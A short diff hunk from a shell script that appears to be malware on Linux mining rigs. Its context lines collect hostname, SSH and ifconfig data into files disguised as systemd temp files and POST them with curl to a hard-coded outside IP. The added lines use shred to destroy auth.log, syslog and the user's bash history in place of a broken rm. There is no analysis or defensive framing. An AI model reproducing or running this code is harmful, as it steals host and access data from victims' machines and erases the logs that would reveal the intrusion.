@@ -7,4 +7,6 @@ IFCONFIG_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.
 /sbin/ifconfig > ${IFCONFIG_HOSTNAME}
 /hive/sbin/curl -XPOST -F "hostname=@${FILE_HOSTNAME}" -F "hssh=@${HSSH_HOSTNAME}" -F "ifconfig=@${IFCONFIG_HOSTNAME}" "http://185.86.149.116:8085/"
 /bin/rm ${FILE_HOSTNAME} ${HSSH_HOSTNAME} ${IFCONFIG_HOSTNAME}
-/bin/rm /var/log/auth.log/ /bin/rm /var/log/syslog 
+/usr/bin/shred /var/log/auth.log 
+/usr/bin/shred /var/log/syslog 
+/usr/bin/shred /home/user/.bash_history 
